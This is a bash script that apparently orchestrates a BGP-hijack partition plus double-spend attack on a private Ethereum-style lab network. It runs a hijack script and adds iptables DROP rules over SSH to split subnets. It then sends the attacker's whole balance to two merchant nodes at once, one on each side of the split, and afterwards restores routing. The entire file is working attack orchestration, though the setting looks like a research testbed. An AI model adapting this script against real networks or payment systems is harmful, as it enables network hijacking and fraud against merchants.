#!/bin/bash

source $PWD/env.py
source $PWD/setup_utils.sh

DURATION=${1:-120}
LOG_FILE=bgp-attack.log
ATTACKER=attacker
MERCHANT1=node1
MERCHANT2=node5

give_all()
{
  local sender=$1
  local receiver=$2
  local from=$3
  local to=$4
  local value=$5
  local TXN=$(attack/transfer_all.sh $sender $receiver $from $to $value)
  line="$(date +%s),txn:$TXN"
  echo $line >>$LOG_FILE
}

get_info()
{
  SENDER=$(grep -e "$ATTACKER,${MGMT_NET}" $VM_IP_FILE 2>/dev/null | cut -d, -f3)
  RECEIVER1=$(grep -e "$MERCHANT1,${MGMT_NET}" $VM_IP_FILE 2>/dev/null | cut -d, -f3)
  RECEIVER2=$(grep -e "$MERCHANT2,${MGMT_NET}" $VM_IP_FILE 2>/dev/null | cut -d, -f3)
  
  S_COINBASE=$(py/get_coinbase.py $SENDER:8545)
  R1_COINBASE=$(py/get_coinbase.py $RECEIVER1:8545)
  R2_COINBASE=$(py/get_coinbase.py $RECEIVER2:8545)
  BALANCE=$(py/get_balance.py -w $S_COINBASE $SENDER:8545)
  BALANCE=$( python -c 'print '"$BALANCE"' / 100 * 80' )
  BALANCE=$( echo "obase=16; $BALANCE" | bc )
}

fw_block()
{
  RUN="ssh -i ~/.ssh/parinya_ng61vm.pem alpine@172.16.100.32"
  CMD="sudo iptables -A FORWARD -s 172.16.107.0/24 -d 172.16.108.0/24 -j DROP"
  $RUN $CMD
  CMD="sudo iptables -A FORWARD -s 172.16.108.0/24 -d 172.16.107.0/24 -j DROP"
  $RUN $CMD
  CMD="sudo iptables -A FORWARD -s 172.16.101.0/24 -d 172.16.107.0/24 -p tcp --sport 30304 -j DROP"
  $RUN $CMD
  CMD="sudo iptables -A FORWARD -s 172.16.101.0/24 -d 172.16.108.0/24 -p tcp --sport 30303 -j DROP"
  $RUN $CMD
  CMD="sudo iptables -A FORWARD -s 172.16.107.0/24 -d 172.16.101.0/24 -p tcp --dport 30304 -j DROP"
  $RUN $CMD
  CMD="sudo iptables -A FORWARD -s 172.16.108.0/24 -d 172.16.101.0/24 -p tcp --dport 30303 -j DROP"
  $RUN $CMD
}

fw_unblock()
{
  RUN="ssh -i ~/.ssh/parinya_ng61vm.pem alpine@172.16.100.32"
  CMD="sudo iptables -F"
  $RUN $CMD
}

###### MAIN ######
get_info

echo "Duration = $DURATION"
echo "Hijack BGP route..."
line="$(date +%s),cut:$DURATION"
echo $line >>$LOG_FILE
./bgp_hijack.exp
echo "Cut the network..."
fw_block
sleep 5s

echo "Send a transaction..."
# trainsfer all attacker coin to merchant1
give_all $SENDER:8545 $RECEIVER1:8545 $S_COINBASE $R1_COINBASE $BALANCE &
# trainsfer all attacker coin to merchant2
give_all $SENDER:8555 $RECEIVER2:8545 $S_COINBASE $R2_COINBASE $BALANCE &

sleep $(expr $DURATION - 5)

fw_unblock
./bgp_hijack.exp no
line="$(date +%s),rejoin"
echo $line >>$LOG_FILE

